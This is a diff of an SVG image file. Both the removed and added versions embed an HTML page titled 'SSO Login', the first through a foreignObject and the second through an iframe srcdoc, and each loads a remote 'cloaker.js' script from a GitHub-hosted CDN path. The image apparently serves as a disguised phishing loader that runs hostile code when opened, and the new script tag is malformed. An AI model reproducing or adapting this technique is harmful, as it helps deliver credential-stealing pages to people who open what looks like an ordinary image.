@@ -1,14 +1,11 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 800 600">
   <foreignObject width="100%" height="100%">
-    <xhtml:html xmlns:xhtml="http://www.w3.org/1999/xhtml" lang="en">
-      <xhtml:head>
-        <xhtml:meta charset="UTF-8" />
-        <xhtml:meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <xhtml:title>SSO Login</xhtml:title>
-      </xhtml:head>
-      <xhtml:body>
-        <xhtml:script src="https://gcore.jsdelivr.net/gh/zaka13X/sj@main/scripts/cloaker.js"></xhtml:script>
-      </xhtml:body>
-    </xhtml:html>
+    <iframe 
+      xmlns="http://www.w3.org/1999/xhtml"
+      srcdoc="&lt;!DOCTYPE html&gt; &lt;html lang='en'&gt; &lt;head&gt; &lt;meta charset='UTF-8'&gt; &lt;meta name='viewport' content='width=device-width, initial-scale=1.0'&gt; &lt;title&gt;SSO Login&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script src='https://gcore.jsdelivr.net/gh/zaka13X/sj/scripts/cloaker.js; &lt;/body&gt; &lt;/html&gt;"
+      width="100%" 
+      height="100%" 
+      style="border: none;">
+    </iframe>
   </foreignObject>
 </svg>
